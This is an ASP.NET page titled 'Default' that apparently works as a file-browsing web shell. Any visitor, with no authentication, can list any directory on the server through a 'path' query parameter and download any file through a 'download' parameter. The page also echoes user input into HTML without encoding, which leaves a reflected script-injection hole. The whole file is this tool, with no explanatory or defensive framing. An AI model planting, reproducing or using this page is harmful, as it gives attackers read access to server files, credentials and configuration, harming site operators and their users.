<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Web" %>

<script runat="server">
    protected string RootPath = HttpRuntime.AppDomainAppPath;

    protected string CurrentPath => string.IsNullOrEmpty(Request.QueryString["path"])
        ? RootPath
        : Request.QueryString["path"];

    protected string Keyword => Request.QueryString["keyword"] ?? "";

    protected string GenerateDirectoryListing()
    {
        try
        {
            if (!Directory.Exists(CurrentPath))
                return "<p style='color:red;'>Invalid path</p>";

            var html = "<ul>";

            foreach (var dir in Directory.GetDirectories(CurrentPath))
            {
                var folderName = Path.GetFileName(dir);
                if (!string.IsNullOrEmpty(Keyword) &&
                    !folderName.Contains(Keyword, StringComparison.OrdinalIgnoreCase))
                    continue;

                var link = "?path=" + HttpUtility.UrlEncode(dir);
                html += $"<li>[D] <a href='{link}'>{folderName}</a></li>";
            }

            foreach (var file in Directory.GetFiles(CurrentPath))
            {
                var fileName = Path.GetFileName(file);
                if (!string.IsNullOrEmpty(Keyword) &&
                    !fileName.Contains(Keyword, StringComparison.OrdinalIgnoreCase))
                    continue;

                var downloadLink = "?download=" + HttpUtility.UrlEncode(file);
                html += $"<li>[F] <a href='{downloadLink}'>{fileName}</a></li>";
            }

            html += "</ul>";
            return html;
        }
        catch (Exception ex)
        {
            return $"<p style='color:red;'>error: {HttpUtility.HtmlEncode(ex.Message)}</p>";
        }
    }

    protected void Page_Load(object sender, EventArgs e)
    {
        if (!string.IsNullOrEmpty(Request.QueryString["download"]))
        {
            string filePath = Request.QueryString["download"];
            if (File.Exists(filePath))
            {
                Response.Clear();
                Response.ContentType = "application/octet-stream";
                Response.AddHeader("Content-Disposition", $"attachment; filename={Path.GetFileName(filePath)}");
                Response.WriteFile(filePath);
                Response.End();
            }
        }
    }
</script>

<html>
<head>
    <title>Default</title>
</head>
<body>
    <form method="get">
        <input type="text" name="path" value="<%= CurrentPath %>" style="width:400px;" />
        <input type="text" name="keyword" value="<%= Keyword %>" placeholder="input" />
        <input type="submit" value="go" />
    </form>

    <%= GenerateDirectoryListing() %>
</body>
</html>
